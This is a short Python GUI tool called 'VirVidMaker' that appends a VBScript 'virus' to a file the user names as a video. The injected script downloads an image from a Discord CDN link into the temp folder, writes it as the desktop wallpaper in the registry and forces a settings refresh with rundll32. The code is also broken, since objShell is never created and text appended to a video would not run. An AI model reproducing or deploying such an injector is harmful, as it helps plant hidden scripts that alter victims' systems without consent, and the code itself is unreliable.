import PySimpleGUI as sg
from time import sleep
from os import system
from sys import exit

system('cls')
sg.theme("DarkGray15")
sg.set_options(font=("Consolas", 9), text_color='#FFFFFF')

def done():
    custom = [[sg.Text('Done!')],
              [sg.Button('Exit')],
              [sg.Text('')],
              [sg.Text('Coded by Xemulated')]]

    window = sg.Window('VirVidMaker', custom)

    while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            exit()

def injects(fname):
    file1 = open(fname, "a")  # append mode
    file1.write('\n')
    file1.write('Set objEnv = objShell.Environment("User")\n')
    file1.write('\n')
    file1.write('strDirectory = objShell.ExpandEnvironmentStrings("%temp%")\n')
    file1.write('\n')
    file1.write('dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")\n')
    file1.write('dim bStrm: Set bStrm = createobject("Adodb.Stream")\n')
    file1.write('xHttp.Open "GET", "https://cdn.discordapp.com/avatars/275808021605777409/1f5eae5d8b12034c335309a0150942c5.png?size=512", False\n')
    file1.write('xHttp.Send\n')
    file1.write('\n')
    file1.write('with bStrm\n')
    file1.write("    .type = 1 '//binary\n")
    file1.write('    .open\n')
    file1.write('    .write xHttp.responseBody\n')
    file1.write("    .savetofile strDirectory + "+'"'+"\myImage.png"+'"'+", 2 '//overwrite\n")
    file1.write('end with\n')
    file1.write('\n')
    file1.write('objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", strDirectory + "\myImage.png"\n')
    file1.write('objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True\n')
    file1.close()
    done()

def getdata():
    custom = [[sg.Text('Filename of the video to inject the "virus":')],
              [sg.Text('Press Enter to confirm')],
              [sg.Input('', enable_events=True,  key='-INPUT-', )],
              [sg.Button('Exit')],
              [sg.Button('Submit', visible=False, bind_return_key=True)],
              [sg.Text('')],
              [sg.Text('Coded by Xemulated')]]

    window = sg.Window('VirVidMaker', custom)

    while True:
        event, values = window.read()
        if event == "Exit" or event == sg.WIN_CLOSED:
            exit()
        
        elif event == 'Submit':
            injects(window['-INPUT-'].get())

    window.close()
getdata()
